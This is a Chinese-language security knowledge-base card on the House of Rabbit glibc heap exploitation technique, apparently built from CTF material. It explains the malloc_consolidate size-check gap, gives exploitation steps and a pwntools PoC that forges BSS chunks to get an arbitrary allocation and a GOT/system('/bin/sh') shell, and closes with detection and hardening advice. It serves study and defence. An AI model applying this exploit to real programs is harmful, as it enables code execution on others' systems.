---
id: binary-pwn-heap-house-of-rabbit-malloc-consolidate-fake-chunk-largebin-arbitrary-alloc
title: House of Rabbit：malloc_consolidate 不校验 fastbin size，BSS 伪造 chunk 经 unsorted/largebin 改写 size 实现任意地址分配
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-rabbit-malloc-consolidate-fake-chunk-largebin-arbitrary-alloc
affected_versions: glibc 2.23-2.26（无 tcache）；2.27-2.31 需先填满对应 tcachebin
tags:
- pwn
- heap
- glibc-2.23
- glibc-2.31
- house-of-rabbit
- malloc-consolidate
- fastbin
- largebin
- fake-chunk
- arbitrary-alloc
- bss
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V292
  verified_at: '2026-11-08T08:22:46+08:00'
  notes: 已对照全文与 19 张图逐项核对：图 01-04 大块 mmap/free+top 扩至 0x603020、0x603030 smallbin；图 05-06 在 0x602130/0x602120 伪造 chunk 并改 fastbin fd=0x602130；图 07-08 free smallbin 后 fake 块入 unsorted、size 改 0xa0001；图 09 链入 largebin 最大 bin；图 11-16 mutepig 保护(Partial RELRO/Canary/NX/No PIE)与 add(0x10/0x80/0xa00000/0xfffffffffffff70)、edit(bss 0x602120)、delete(UAF)、input 末字节置零均与卡一致；图 17-19 为 exp 运行中的 top/fd/unsorted 状态。原子性=House of Rabbit 单一堆技巧（demo+例题为同一技巧的两处展示），无需拆分。affected_versions 按原文 2.23-2.26 无 tcache、2.27-2.31 填满 tcachebin 仍可利用填写，未猜 2.32+。dedup 的 duplicate=1 为草稿与已入库同 id 卡自匹配，其余 5 个 related 分别为 House of Peach/Storm、topchunk 泄露、consolidate-unlink 重叠、2.35 tcache 倒灌，均不同链。PoC/地址均为原文环境值，未在本机复跑；卡内对动态 mmap 阈值上调的解释为补充说明并已标注版本差异。
url: /docs/binary/pwn/heap/binary-pwn-heap-house-of-rabbit-malloc-consolidate-fake-chunk-largebin-arbitrary-alloc/
draft: false
kb_aliases:
- House of Rabbit
- house_of_rabbit
- 兔子之家
- malloc_consolidate 伪造堆块
- fastbin size 不校验
- largebin 任意分配
- 0xa0001 size bypass
---

## 一句话结论

House of Rabbit 利用 `malloc_consolidate()` 把 fastbin 块合并进 unsorted bin 时不校验 chunk size 的缺陷：先用 UAF/溢出把 fastbin 的 fd 改到 BSS 上伪造的 chunk，再借一次小堆块 free 触发 consolidate，把伪造块链入 unsorted bin；随后两次改写它的 size（0xa0001 过检查、0xfffffffffffffff1 过 largebin 分配），最终让一次超大 malloc 返回该伪造地址，实现任意地址分配/任意写，配合 GOT 或 `__free_hook` 覆写即可 getshell。

## 原理

- **fastbin 的管理方式**：同尺寸空闲块用 `fd` 单向链表管理，`malloc` 取链头时会检查 `size` 是否与当前请求匹配；正常情况下攻击者无法让 fd 指向任意地址，因为取块时 size 对不上就会报错。
- **malloc_consolidate 的缺陷**：该函数在 free 大块（size ≥ `FASTBIN_CONSOLIDATION_THRESHOLD`，默认 0x10000）或 malloc 需要从 top 取块且 fastbin 非空时被调用，用于把 fastbin 整理进 unsorted bin。它遍历 fastbin 时直接 `size = chunksize(p)`、`nextchunk = chunk_at_offset(p, size)` 做前后合并，**不验证 size 是否属于 fastbin 的合法尺寸**；由于 fastbin 的 `fd` 可被 UAF/溢出改写，fd 指向的伪造块会被当作真实 chunk 执行合并并链入 unsorted bin。
- **为什么伪造两个 chunk**：伪造 chunk1 的 size 设成 `0xfffffffffffffff1`，`chunk_at_offset(p, size)` 在 64 位下回绕到 chunk1 前面的 chunk2（demo 中 chunk2 在 0x602120、chunk1 在 0x602130）；chunk2 的 size `0x11` 提供合法的 `nextsize`，chunk1 的 PREV_INUSE 位让 `nextinuse` 为真，合并逻辑因此把 chunk1 链入 unsorted bin 而不崩溃。
- **为什么 free 小块能触发**：0x80 的 smallbin 块与 top 相邻，free 时并入 top，合并后的 top size（demo 约 0xa21000）超过 `FASTBIN_CONSOLIDATION_THRESHOLD`，`_int_free` 因此调用 `malloc_consolidate`；若目标没有这种条件，直接 malloc 一个大块也会触发。
- **两次 size 改写的作用**：unsorted bin 扫描时 glibc 会检查 `chunksize(victim) > av->system_mem`，超过就报 `malloc(): memory corruption`；所以先把 fake chunk 的 size 改成 `0xa0001`（小于 demo 中约 0xa21000 的 `system_mem`，同时大于 largebin 阈值），让它在 `malloc(0xa00000)` 时被从 unsorted bin 取出并按大小插入 largebin（demo 落到最大 bin 126）；之后再改成 `0xfffffffffffffff1`，让 largebin 分配时任何超大请求都能被它满足。
- **为什么能得到任意地址分配**：largebin 取出 fake chunk 时直接返回 chunk 指针（demo 为 0x602130），对该指针的写入就是 BSS 写；把伪造块放在其他可控/可写地址（如 GOT 附近）时，返回的就是目标地址，后续可覆盖 GOT、`__free_hook` 等。
- **top 扩大的作用**：demo 先 malloc/free 0xa00000 大块两次，第二次申请改由 brk 扩展 top（堆顶约 0xa21000），使后续 small chunk 并入 top 后 size 足够大、能稳定触发 `malloc_consolidate`，并为 `system_mem` 检查提供参照。首次 free mmap 块会抬高动态 mmap 阈值，是同尺寸第二次申请不再走 mmap 的原因；具体阈值行为随 glibc 版本略有差异。

## 触发条件

- glibc 2.23–2.26（无 tcache）最直接；2.27–2.31 有 tcache 时，需要先把对应大小的 tcachebin 填满，目标块才会走 fastbin/unsorted bin 路径（原文注明可以利用但更麻烦）。
- 存在 UAF 或堆溢出，能改写已释放 fastbin chunk 的 `fd`（至少低 7 字节；若输入函数会补零，注意只写 7 字节）；有可控的 BSS/全局缓冲区用于放置伪造 chunk。
- 程序有 malloc 大块或 free 大块的路径以触发 `malloc_consolidate`；demo 用 0xa00000 大块和 0x80 smallbin 块，CTF mutepig 用 1/2/3/13337 四种分配。
- 无 PIE、GOT 可写更利于后续 getshell（mutepig：Partial RELRO、No PIE、Canary、NX）；若开启 PIE/Full RELRO，需要先泄露地址或改打 `__free_hook`/`malloc_hook`。
- 伪造块所在地址必须可写且布局可控（BSS、栈、mmap 区域等）；需要控制 fake chunk 前一个 chunk 的 size 字段以完成回绕合并。

## 利用步骤

1. **扩大 top（可选，demo 需要）**：`malloc(0xa00000)` → `free` → 再 `malloc(0xa00000)` → `free`；第二次申请改由 brk 扩展 top 到约 0xa21000。
2. **准备两类 chunk**：申请一个 fastbin 大小的块（如 0x10，chunk 0x20）和一个 smallbin 大小的块（如 0x80，chunk 0x90）；释放 fastbin 块并保留其 UAF 指针，smallbin 块保持已分配。
3. **在可控 BSS 伪造两个相邻 chunk**：chunk2 位于 chunk1 前 0x10（demo 为 0x602120，size=0x11），chunk1 为 0x602130、size=0xfffffffffffffff1。
4. **改写 fastbin fd**：通过 UAF/溢出把已释放 fastbin 块的 `fd` 指向 chunk1 地址（0x602130），并确保 chunk1/chunk2 的 size 与 PREV_INUSE 布局能让 consolidate 回绕合并到 chunk2。
5. **触发 malloc_consolidate**：free 掉 smallbin 块；它并入 top 使 top size 超过 0x10000，`_int_free` 调用 `malloc_consolidate`，fastbin 链（含 fake chunk1）被整理，chunk1 链入 unsorted bin。
6. **改 size 过检查**：把 chunk1 的 size 改为 `0xa0001`（≤ `system_mem`、属于 largebin 范围）；再 malloc 一个超大块（0xa00000），chunk1 被移入 largebin（最大 bin）。
7. **改 size 为超大值**：把 chunk1 的 size 改为 `0xfffffffffffffff1`；再 malloc 一个极大块（demo/CTF 为 0xfffffffffffff70），largebin 用 chunk1 满足请求，返回伪造地址。
8. **收尾 getshell**：用返回地址写目标——提前在可引用位置放 `/bin/sh`，把 `free@got` 覆盖为 `system`（或改 `__free_hook`），再 free 该块触发 `system("/bin/sh")`。

## PoC

核心序列（地址与索引取自原文 demo/mutepig 环境，glibc 2.23 + 无 PIE；实际题目需按布局调整）：

```python
from pwn import *

io = process('./demo')

def add(idx, data):
    io.sendline('1'); io.sendline(str(idx)); io.send(data)

def free(idx):
    io.sendline('2'); io.sendline(str(idx))

def edit(idx, data, data2):
    io.sendline('3'); io.sendline(str(idx)); io.sendline(data); io.sendline(data2)

# 1) 两次大块 mmap/free，扩大 top
add(3, b'aaaa'); free(0)
add(3, b'aaaa'); free(1)

# 2) fastbin 块 + smallbin 块
add(1, b'fast')    # idx2: malloc(0x10)
add(2, b'small')   # idx3: malloc(0x80)
free(2)            # UAF：fastbin 块

# 3) BSS 伪造两个 chunk；把 fastbin fd 指向 fake_chunk1 (0x602130)
payload = p64(0) + p64(0x11) + p64(0) + p64(0xfffffffffffffff1)
edit(2, p64(0x602130)[:7], payload)

# 4) free smallbin 块 -> 并入 top 触发 malloc_consolidate -> fake_chunk1 入 unsorted
free(3)

# 5) size 改为 0xa0001，malloc 大块把它移入 largebin，并提前写入 /bin/sh
payload = p64(0xfffffffffffffff0) + p64(0x10) + p64(0) + p64(0xa00001)
edit(3, b'a' * 7, payload)
add(3, b'/bin/sh')

# 6) size 改为 0xfffffffffffffff1，超大 malloc 返回 fake_chunk1（BSS 地址）
payload = p64(0xfffffffffffffff0) + p64(0x10) + p64(0) + p64(0xfffffffffffffff1)
edit(3, b'w' * 7, payload)
add(13337, b'a' * 7)

# 7) 收尾（mutepig 例题）：用任意分配覆写 GOT / hook 后 free 含 /bin/sh 的块
# add(1, p64(0x602018)[:7]); edit(3, p64(0x4006e6)[:7], b'aaaa'); free(2)
io.interactive()
```

## 变体与关联

- **变体**：把伪造 chunk 放到栈/mmap/其他可控全局区，可改变任意分配的目标地址；选择不同 fake chunk size 可落到不同 largebin；2.27+ 需先填满 tcache；也可与 unsorted bin attack、largebin attack 组合改 `__free_hook`/`malloc_hook`；safe-linking（2.32+）会给 fastbin fd 加指针保护，本技术主要针对 2.23–2.31。
- **关联卡片**：[[binary-pwn-heap-malloc-consolidate-unlink-overlapping-via-malloc]]（同为 malloc_consolidate 利用，但目标是 unlink 堆块重叠，不是 largebin 任意分配）；[[binary-pwn-heap-topchunk-exhaustion-malloc-consolidate-fastbin-unsorted-libc-leak]]（同为 consolidate 触发，但目标是 libc 泄露）；[[binary-pwn-heap-house-of-storm-unsorted-largebin-fake-chunk]]（unsorted+largebin 伪造 chunk 打 `__free_hook`，可对照）；[[binary-pwn-heap-house-of-roman-fastbin-unsortedbin-malloc-hook-bruteforce]]（同为 House of 系列，目标 malloc_hook）。

## 检测与防御

- **代码层**：free 后立即置空指针，消除 UAF；限制 edit 对 BSS/全局区的任意写；对用户输入的指针索引做边界校验；避免把可写全局缓冲区暴露给堆操作；开启 PIE/Full RELRO 增加 GOT 覆写难度。
- **glibc 层**：升级到带 tcache/safe-linking 的版本（2.32+）并保持补丁；注意 tcache 只是增加步骤，2.27–2.31 填满 tcache 仍可复用本技术，不能只依赖版本升级。
- **运行检测**：监控 fastbin `fd` 指向非堆地址（尤其 BSS/全局区）、堆块 size 异常（0xa0001、0xfffffffffffffff1 等超大/非对齐值）、malloc_consolidate 前后 unsorted/largebin 出现 BSS 地址；对 0xa00000 级大块分配后紧接 GOT/hook 写的行为告警。
- **加固**：使用 glibc 的 malloc 检查/加固选项，部署堆元数据完整性监控；CTF 之外的产品代码避免暴露任意大小 malloc/大块 free 的组合入口。
